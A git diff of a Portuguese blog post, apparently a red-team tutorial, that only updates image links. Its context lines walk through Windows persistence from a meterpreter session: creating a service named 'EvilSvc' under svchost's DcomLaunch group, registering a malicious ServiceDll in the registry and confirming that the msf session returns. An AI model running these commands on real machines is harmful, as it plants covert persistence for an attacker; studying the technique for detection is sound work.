@@ -50,7 +50,7 @@ Os exemplos de comandos são de uma shell meterpreter, então as flags e as stri
 
 - Agora criamos o service com o ```binpath``` apontando para o svchost usando o grupo DcomLaunch.
 
-![createevilsvc](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/createevilsvc.png)
+![createevilsvc](/img/createevilsvc.png)
 
 ```
 sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
@@ -58,7 +58,7 @@ sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" t
 
 - depois de criar o service verifique se esta tudo certo
 
-![verifyevilsvc](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/verifyevilsvc.png)
+![verifyevilsvc](/img/verifyevilsvc.png)
 
 ```
 sc.exe query EvilSvc
@@ -72,7 +72,7 @@ sc.exe query EvilSvc
 
 - Aqui vamos editar a registry key associada ao EvilSvc para adicionar a dll maliciosa ```HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\```.
 
-![setpathsvcdll](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/setpathsvcdll.png)
+![setpathsvcdll](/img/setpathsvcdll.png)
 
 ```
 reg.exe add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f
@@ -80,7 +80,7 @@ reg.exe add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v Service
 
 - verifique se o path foi setado
 
-![verifysvcdllpath](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/verifysvcdllpath.png)
+![verifysvcdllpath](/img/verifysvcdllpath.png)
 
 ```
 reg.exe queryHKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll 
@@ -92,7 +92,7 @@ reg.exe queryHKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v Servic
 
 - Nessa parte adicionamos o EvilSvc ao grupo DcomLaunch alterando a registry key ```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost /v DcomLaunch```. No artigo é feito direto pelo registry editor mas como só temos acesso via cli, vamos usar powershell pra isso.
 
-![setsvctodcom](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/setsvctodcom.png)
+![setsvctodcom](/img/setsvctodcom.png)
 
 
 ```
@@ -115,7 +115,7 @@ Você pode juntar isso numa oneliner e executar como na imagem acima.
 
 - Depois verifique se o EvilSvc foi adicionado
 
-![verifysvcindcom](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/verifysvcindcom.png)
+![verifysvcindcom](/img/verifysvcindcom.png)
 
 ```
 reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v DcomLaunch
@@ -124,13 +124,13 @@ reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v Dco
 <strong>Agora com tudo feito a persistencia está pronta. Como o service foi criado com "start auto", quando houver algum reboot o service será iniciado e carregado com o grupo DcomLaunch.</strong>
 
 - msf session
-![getsession](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/getsession.png)
+![getsession](/img/getsession.png)
 
 - svc running with rundll32
-![svcrun1](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/svcrun1.png)
+![svcrun1](/img/svcrun1.png)
 
 - svc dll path
-![svcrun2](https://github.com/geleiaa/geleiaa.github.io/blob/master/img/svcrun2.png)
+![svcrun2](/img/svcrun2.png)
 
 
 
